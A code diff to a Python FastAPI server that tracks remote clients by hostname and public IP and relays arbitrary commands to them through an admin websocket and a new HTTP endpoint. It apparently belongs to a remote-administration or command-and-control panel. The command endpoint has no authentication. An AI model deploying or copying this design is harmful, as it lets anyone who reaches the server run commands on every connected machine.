@@ -51,7 +51,7 @@ async def get_clients():
         net_title = f"Network {public_ip}" if public_ip != "Unknown Network" else "Local Network"
         if net_title not in networks:
             networks[net_title] = []
-        status = "Online" if now - last_seen.get(cid, 0) < 20 else "Offline"
+        status = "Online" if now - last_seen.get(cid, 0) < 30 else "Offline"
         networks[net_title].append({
             "id": cid,
             "hostname": hostname,
@@ -60,10 +60,38 @@ async def get_clients():
         })
     return networks
 
+@app.get("/api/client/{client_id}/info")
+async def get_client_info(client_id: str):
+    return {
+        "client_id": client_id,
+        "info": client_infos.get(client_id, {}),
+        "last_seen": last_seen.get(client_id, 0),
+        "status": "Online" if time.time() - last_seen.get(client_id, 0) < 30 else "Offline"
+    }
+
+@app.post("/api/client/{client_id}/command")
+async def send_command_to_client(client_id: str, request: Request):
+    data = await request.json()
+    command = data.get("command", "")
+    if client_id in clients:
+        try:
+            await clients[client_id].send_text(command)
+            return {"status": "success", "message": f"Command sent to {client_id}"}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+    return {"status": "error", "message": "Client not found"}
+
+@app.post("/logerror")
+async def log_error(req: Request):
+    data = await req.json()
+    logging.error(f"Client Error Report: {json.dumps(data)}")
+    return {"status": "logged"}
+
 @app.websocket("/ws/client/{client_id}")
 async def ws_client(ws: WebSocket, client_id: str):
     await ws.accept()
     sysinfo = None
+
     try:
         while True:
             msg = await ws.receive()
@@ -98,6 +126,8 @@ async def ws_client(ws: WebSocket, client_id: str):
     public_ip_map[client_id] = public_ip
     last_seen[client_id] = time.time()
 
+    logging.info(f"Client connected: {hostname} ({client_id})")
+
     try:
         while True:
             msg = await ws.receive()
@@ -108,6 +138,15 @@ async def ws_client(ws: WebSocket, client_id: str):
                     data = json.loads(msg["text"])
                     if data.get("type") == "client_info":
                         client_infos[client_id] = data.get("data", {})
+                        if admin_ws:
+                            try:
+                                await admin_ws.send_text(json.dumps({
+                                    "type": "client_update",
+                                    "client_id": client_id,
+                                    "data": data.get("data", {})
+                                }))
+                            except:
+                                admin_ws = None
                         continue
                 except json.JSONDecodeError:
                     pass
@@ -135,7 +174,14 @@ async def ws_admin(ws: WebSocket):
     await ws.accept()
     admin_ws = ws
     logging.info("Admin connected")
+
     try:
+        await ws.send_text(json.dumps({
+            "type": "init",
+            "clients": {cid: {"info": info, "last_seen": last_seen.get(cid, 0)}
+                        for cid, info in client_infos.items()}
+        }))
+
         while True:
             msg = await ws.receive_json()
             target = msg.get("target")
@@ -143,13 +189,29 @@ async def ws_admin(ws: WebSocket):
             if target in clients:
                 try:
                     await clients[target].send_text(cmd)
-                except:
-                    await ws.send_text(f"Error sending to {target}")
+                except Exception as e:
+                    await ws.send_text(f"Error sending to {target}: {str(e)}")
             else:
                 await ws.send_text(f"Client {target} not found or offline")
+
     except WebSocketDisconnect:
         logging.info("Admin disconnected")
         admin_ws = None
+
+@app.get("/")
+async def root():
+    try:
+        with open("static/index.html", 'r', encoding='utf-8') as f:
+            return HTMLResponse(f.read())
+    except FileNotFoundError:
+        return HTMLResponse("""
+        <html>
+            <body>
+                <h1>Admin Panel</h1>
+                <p>Please create static/index.html file</p>
+            </body>
+        </html>
+        """)
 
 def remove_client(cid):
     clients.pop(cid, None)
@@ -163,5 +225,13 @@ def remove_client(cid):
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
 if __name__ == "__main__":
+    os.makedirs("static", exist_ok=True)
     port = int(os.environ.get("PORT", 10000))
-    uvicorn.run("main:app", host="0.0.0.0", port=port)
+    uvicorn.run(
+        "main:app",
+        host="0.0.0.0",
+        port=port,
+        reload=True,
+        ws_ping_interval=30,   # Neu: Server Ping-Interval explizit setzen
+        ws_ping_timeout=60     # Neu: großzügiger Timeout setzen
+    )
